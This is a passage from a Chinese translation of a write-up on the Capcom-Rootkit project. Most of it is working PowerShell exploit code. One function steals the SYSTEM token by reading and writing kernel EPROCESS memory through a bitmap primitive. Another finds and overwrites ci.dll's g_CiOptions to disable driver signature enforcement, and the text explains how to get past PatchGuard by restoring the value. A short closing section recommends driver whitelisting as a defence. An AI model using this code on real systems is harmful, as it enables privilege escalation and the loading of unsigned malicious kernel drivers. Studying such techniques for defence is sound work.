            '6.3' # Win8.1 / 2k12R2
            {
                $UniqueProcessIdOffset = 0x2e0
                $TokenOffset = 0x348          
                $ActiveProcessLinks = 0x2e8
            }
            '6.2' # Win8 / 2k12
            {
                $UniqueProcessIdOffset = 0x2e0
                $TokenOffset = 0x348          
                $ActiveProcessLinks = 0x2e8
            }
            '6.1' # Win7 / 2k8R2
            {
                $UniqueProcessIdOffset = 0x180
                $TokenOffset = 0x208          
                $ActiveProcessLinks = 0x188
            }
        }
        # Get EPROCESS entry for System process
        $SystemModuleArray = Get-LoadedModules
        $KernelBase = $SystemModuleArray[0].ImageBase
        $KernelType = ($SystemModuleArray[0].ImageName -split "\")[-1]
        $KernelHanle = [Capcom]::LoadLibrary("$KernelType")
        $PsInitialSystemProcess = [Capcom]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
        $SysEprocessPtr = $PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase
        $CallResult = [Capcom]::FreeLibrary($KernelHanle)
        $SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
        $SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
        Write-Output "`n[+] SYSTEM Token: 0x$("{0:X}" -f $SysToken)"
        # Get EPROCESS entry for PID
        $NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
        while($true) {
            $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
            if ($NextPID -eq $ProcPID) {
                $TargetTokenAddr = $NextProcess+$TokenOffset
                Write-Output "[+] Found PID: $NextPID"
                Write-Output "[+] PID token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
                break
            }
            $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
        }
        # Duplicate token!
        Write-Output "[!] Duplicating SYSTEM token!`n"
        Bitmap-Write -Address $TargetTokenAddr -Value $SysToken
    }
**绕过强制驱动签名**
我建议你看下@j00ru的关于强制驱动签名的[write-up](http://j00ru.vexillium.org/?p=377)。结果证明Windows上的代码完整性有一个独立的二进制（ci.dll，%WINDIR%System32）管理。在Windows
8之前，CI导出了一个全局的boolean变量g_CiEnabled，完美的表示签名是否启动。在Windows
8之后，g_CiEnabled被另一个全局变量（g_CiOptions）代替，其是一个标志的组合（最重要的是0x0=禁用，0x6=启用，0x8=测试模式）。
由于Δt free-time限制，这个模块只针对Win8+中使用的g_CiOptions。然而，类似的方法可以用于g_CiEnabled（欢迎GitHub
pull
请求）。基本上，我们将使用和Derusbi恶意软件的作者一样的技术。因为g_CiOptions没有导出，我们不得不在patch这个值时做些动态计算。如果我们反编译CI!CiInitialize，我们能看见g_CiOptions的指针。
与我们之前做的类似，我们能在CI!CiInitialize中泄漏地址，而不是用任何漏洞。
目前只实现了一些逻辑，使用我们的bitmap原语来读取字节，以寻找第一个“jmp”（0xE9），和第一个“mov dword ptr[xxxxx],
ecx”（0x890D）。一旦我们有了g_CiOptions的地址，我们能设置我们想要的任何值。Powershell函数如下。
    function Capcom-DriverSigning {
        param ([Int]$SetValue)
        # Check our bitmaps have been staged into memory
        if (!$ManagerBitmap -Or !$WorkerBitmap) {
            Capcom-StageGDI
            if ($DriverNotLoaded -eq $true) {
                Return
            }
        }
        # Leak CI base => $SystemModuleCI.ImageBase
        $SystemModuleCI = Get-LoadedModules |Where-Object {$_.ImageName -Like "*CI.dll"}
        # We need DONT_RESOLVE_DLL_REFERENCES for CI LoadLibraryEx
        $CIHanle = [Capcom]::LoadLibraryEx("ci.dll", [IntPtr]::Zero, 0x1)
        $CiInitialize = [Capcom]::GetProcAddress($CIHanle, "CiInitialize")
        # Calculate => CI!CiInitialize
        $CiInitializePtr = $CiInitialize.ToInt64() - $CIHanle + $SystemModuleCI.ImageBase
        Write-Output "`n[+] CI!CiInitialize: $('{0:X}' -f $CiInitializePtr)"
        # Free CI handle
        $CallResult = [Capcom]::FreeLibrary($CIHanle)
        # Calculate => CipInitialize
        # jmp CI!CipInitialize
        for ($i=0;$i -lt 500;$i++) {
            $val = ("{0:X}" -f $(Bitmap-Read -Address $($CiInitializePtr + $i))) -split '(..)' | ? { $_ }
            # Look for the first jmp instruction
            if ($val[-1] -eq "E9") {
                $Distance = [Int]"0x$(($val[-3,-2]) -join '')"
                $CipInitialize = $Distance + 5 + $CiInitializePtr + $i
                Write-Output "[+] CI!CipInitialize: $('{0:X}' -f $CipInitialize)"
                break
            }
        }
        # Calculate => g_CiOptions
        # mov dword ptr [CI!g_CiOptions],ecx
        for ($i=0;$i -lt 500;$i++) {
            $val = ("{0:X}" -f $(Bitmap-Read -Address $($CipInitialize + $i))) -split '(..)' | ? { $_ }
            # Look for the first jmp instruction
            if ($val[-1] -eq "89" -And $val[-2] -eq "0D") {
                $Distance = [Int]"0x$(($val[-6..-3]) -join '')"
                $g_CiOptions = $Distance + 6 + $CipInitialize + $i
                Write-Output "[+] CI!g_CiOptions: $('{0:X}' -f $g_CiOptions)"
                break
            }
        }
        # print g_CiOptions
        Write-Output "[+] Current CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
        if ($SetValue) {
            Bitmap-Write -Address $g_CiOptions -Value $SetValue
            # print new g_CiOptions
            Write-Output "[!] New CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
        }
    }
截图如下，当前的g_CiOptions值是0x6（驱动签名启动了），且阻止了我们加载evil.sys。
在覆写这个值后，我们能成功加载我们的未签名的驱动。
不过g_CiOptions被PatchGuard保护，意味着如果这个值改变了，Windows将蓝屏（CRITICAL_STRUCTURE_CORRUPTION）。然而这个不太可能发生，当测试时我不得不等待了一个小时才等到PatchGuard触发。如果你加载了未签名的驱动，且恢复了这个值，PatchGuard将不会意识到。我的深度防御的建议是在驱动加载时触发CI的PatchGuard检查，尽管这个也不能阻止攻击者反射加载驱动，但会提高门槛。
**0x04 想法**
第三方，签名的驱动对Windows内核构成了严重威胁，我确信这个例子已经说明了这种情况。我也发现实现简单的内核subversion比想象中容易，尤其是与PatchGuard有关的。总的来说，我认为最明智的做法是组织使用驱动白名单来部署设备保护，以便消除这种类型的攻击。
[Capcom-Rootkit](https://github.com/FuzzySecurity/Capcom-Rootkit)在GitHub中提供，用于教育/测试的目的，不要做坏事。